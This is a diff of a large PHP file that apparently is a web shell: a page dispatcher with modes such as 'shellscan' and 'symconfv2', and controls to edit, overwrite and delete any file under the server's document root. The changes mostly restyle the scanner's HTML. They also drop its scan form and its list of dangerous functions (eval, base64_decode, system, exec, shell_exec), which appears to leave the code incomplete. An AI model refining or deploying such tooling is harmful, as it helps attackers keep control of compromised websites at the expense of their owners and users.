@@ -3758,7 +3758,7 @@ if ($submit) {
   </form>
 </div>
 <?php
-} elseif ($_GET['do'] == 'shellscan') {
+}elseif ($_GET['do'] == 'shellscan') {
   ?>
   <script type="text/javascript">
     function MM_openBrWindow(c, a, b) {
@@ -3773,9 +3773,9 @@ if ($submit) {
   </style>
   </head>
   <body>
-  <center>
+  <div style="text-align: center;">
     <h3 style="color: white;">Shell Scanner</h3>
-  </center>
+  </div>
 <?php
 if (isset($_REQUEST['edit']) && $_REQUEST['edit'] == 'file') {
   if (isset($_POST['yes'])) {
@@ -3792,9 +3792,9 @@ if (isset($_REQUEST['edit']) && $_REQUEST['edit'] == 'file') {
         $isi = $_POST['content'];
         fwrite($handle, stripslashes($isi));
         fclose($handle);
-        $stat = "<center><strong>edited successfully<br>";
+        $stat = "<div style='text-align: center;'><strong>edited successfully</div><br>";
       } else {
-        $stat = "<center><font color=red><strong>Error! File may not be writable.</font></center>";
+        $stat = "<div style='text-align: center; color: red;'><strong>Error! File may not be writable.</div>";
       }
     }
     if (isset($_POST['close'])) {
@@ -3805,12 +3805,12 @@ if (isset($_REQUEST['edit']) && $_REQUEST['edit'] == 'file') {
       $vuln = $_GET['bug'];
       $contents = file_get_contents($filename);
       ?>
-        <center>
+        <div style="text-align: center;">
           <form method="post" action="">
-            <table>
+            <table style="margin: 0 auto; text-align: left;">
               <tr>
                 <td align="left" class="me">
-                  <strong><?= htmlspecialchars($filename) ?>&nbsp;&nbsp;>> Contains :&nbsp;<?= htmlspecialchars($vuln) ?></strong>
+                  <strong><?= htmlspecialchars($filename) ?>&nbsp;&nbsp;&gt;&gt; Contains :&nbsp;<?= htmlspecialchars($vuln) ?></strong>
                 </td>
               </tr>
               <tr>
@@ -3820,37 +3820,34 @@ if (isset($_REQUEST['edit']) && $_REQUEST['edit'] == 'file') {
                   <br>
                 </td>
               </tr>
-              <tr>
-                <td align="center" class="me">
-<?php
-if (isset($_POST['delete'])) {
-  echo "Are you sure to delete " . htmlspecialchars($filename) . " ?";
-  ?>
-                    <tr>
-                      <td align="center" class="me">
-                        <input type="submit" name="yes" value=" Y E S ">
-                        <input type="submit" name="no" value=" N O ">
-                      </td>
-                    </tr>
-<?php
-} else {
-  echo $stat;
-  ?>
-                    <tr>
-                      <td align="right" class="me">
-                        <input type="submit" name="close" value=" C l o s e ">
-                        <input type="submit" name="delete" value=" D e l e t e ">
-                        <input type="submit" name="update" value=" S a v e ">
-                      </td>
-                    </tr>
-<?php
-}
-?>
-                </td>
-              </tr>
+              
+              <!-- PERBAIKAN: Tombol dipisahkan secara struktural menggunakan baris tr tersendiri -->
+              <?php if (isset($_POST['delete'])): ?>
+                <tr>
+                  <td align="center" class="me">
+                    <p style="color: yellow;">Are you sure to delete <?= htmlspecialchars($filename) ?> ?</p>
+                    <input type="submit" name="yes" value=" Y E S ">
+                    <input type="submit" name="no" value=" N O ">
+                  </td>
+                </tr>
+              <?php else: ?>
+                <?php if ($stat != ""): ?>
+                  <tr>
+                    <td><?= $stat ?></td>
+                  </tr>
+                <?php endif; ?>
+                <tr>
+                  <td align="right" class="me">
+                    <input type="submit" name="close" value=" C l o s e ">
+                    <input type="submit" name="delete" value=" D e l e t e ">
+                    <input type="submit" name="update" value=" S a v e ">
+                  </td>
+                </tr>
+              <?php endif; ?>
+              
             </table>
           </form>
-        </center>
+        </div>
 <?php
 } else {
   echo "<br><br><br><font color=red size=3><b><center>" . htmlspecialchars($filename) . " not exist...</b></font><br><br><br><br><br><br><br>";
@@ -3890,15 +3887,18 @@ if (isset($_POST['delete'])) {
     }
   }
   ?>
-    <center>
-      <table border="0" width="90%" cellpadding="5">
-        <tr>
-          <td class="me" align="right" width="30"><b>No</b></td>
-          <td class="me" align="center" width="105"><b>Type</b></td>
-          <td class="me" align="center"><b>File Location</b></td>
-          <td class="me" align="center" width="150"><b>Last Edit</b></td>
-          <td class="me" align="right" width="80"><b>File Size</b></td>
-        </tr>
+    <div style="text-align: center;">
+      <table border="0" width="90%" cellpadding="5" style="margin: 0 auto;">
+        <thead>
+          <tr>
+            <td class="me" align="right" width="30"><b>No</b></td>
+            <td class="me" align="center" width="105"><b>Type</b></td>
+            <td class="me" align="center"><b>File Location</b></td>
+            <td class="me" align="center" width="150"><b>Last Edit</b></td>
+            <td class="me" align="right" width="80"><b>File Size</b></td>
+          </tr>
+        </thead>
+        <tbody>
 <?php
 $target = $_SERVER['DOCUMENT_ROOT'];
 $i = 0;
@@ -3971,103 +3971,16 @@ if ($sis == 0) {
                     <td align="right"><?= $size ?> byte</td>
                   </tr>
 <?php
-break;
-}
-}
-}
-
-if (isset($_POST['textV']) && $_POST['textV'] != "") {
-  $text = $_POST['textV'];
-  if (preg_match("/" . preg_quote($text, '/') . "/", $op)) {
-    $i++;
-    ?>
-                <tr onMouseOver="this.style.backgroundColor='#444444'" onmouseout="this.style.backgroundColor='transparent'">
-                  <td align="right"><?= $i ?></td>
-                  <td align="center"><?= htmlspecialchars($text) ?></td>
-                  <td align="left">
-                    <a href="#" onClick="MM_openBrWindow('?edit=file&file=<?= urlencode($file) ?>&bug=<?= urlencode($text) ?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?= htmlspecialchars($file) ?></a>
-                  </td>
-                  <td align="center"><?= $last ?> GMT+9</td>
-                  <td align="right"><?= $size ?> byte</td>
-                </tr>
-<?php
-}
-}
-}
-}
-
-if ($i == 0) {
-  $x = 0;
-  foreach ($cek as $bugs) {
-    if ($bugs != "") {
-      $x++;
-      ?>
-              <tr onMouseOver="this.style.backgroundColor='#444444'" onmouseout="this.style.backgroundColor='transparent'">
-                <td align="right"><?= $x ?></td>
-                <td align="center"><?= htmlspecialchars($bugs) ?></td>
-                <td align="center"> not exist </td>
-                <td align="center"> no record </td>
-                <td align="right"> -&nbsp;&nbsp;&nbsp;&nbsp;byte </td>
-              </tr>
-<?php
+      break; // Keluar dari loop bugs setelah satu kecocokan ditemukan untuk file ini
+    }
+  }
 }
 }
 }
 ?>
+        </tbody>
       </table>
-    </center>
-<?php
-} else {
-  $find = array('default', 'base64_decode', 'system', 'passthru', 'popen', 'exec', 'shell_exec', 'eval', 'move_uploaded_file');
-  ?>
-    <form id="fCheck" name="fCheck" method="post" action="" autocomplete="off">
-      <center>
-        <table class="single" width="400" border="1" cellpadding="10">
-          <tr>
-            <td class="me">
-              <center>
-                <b>S e l e c t &nbsp;&nbsp;S c a n&nbsp;&nbsp;T y p e :</b><br>
-                <table class="me" width="200">
-                  <tr>
-                    <td class="me">
-                      <script language="javascript">
-                        var master = 0;
-                        function cekKlik() {
-                          var textV = document.getElementById('textV');
-                          var cekV = document.getElementById('cekV');
-                          textV.disabled = !cekV.checked;
-                          updateSubmit();
-                        }
-                        function checkValue(checkbox) {
-                          if (checkbox.checked) master++;
-                          else if (master > 0) master--;
-                          updateSubmit();
-                        }
-                        function updateSubmit() {
-                          document.fCheck.Submit.disabled = (master === 0);
-                        }
-                      </script>
-<?php
-foreach ($find as $bug) {
-  ?>
-                        <input onClick="checkValue(this)" name="<?= htmlspecialchars($bug) ?>" type="checkbox" id="<?= htmlspecialchars($bug) ?>" value="<?= htmlspecialchars($bug) ?>" />&nbsp;<?= htmlspecialchars($bug) ?><br>
-<?php
-}
-?>
-                      <input name="cekV" type="checkbox" onClick="cekKlik()" id="cekV" value="cekV">
-                      <input class="isi" disabled="disabled" name="textV" value="other key word" onFocus="this.select()" type="text" id="textV">
-                      <br><br>
-                      <input type="hidden" name="asal" value="abcd">
-                      <input disabled="disabled" type="submit" name="Submit" value=" S t a r t&nbsp;&nbsp;S c a n " />
-                    </td>
-                  </tr>
-                </table>
-              </center>
-            </td>
-          </tr>
-        </table>
-      </center>
-    </form>
+    </div>
 <?php
 }
 } elseif ($_GET['do'] == 'symconfv2') { ?>
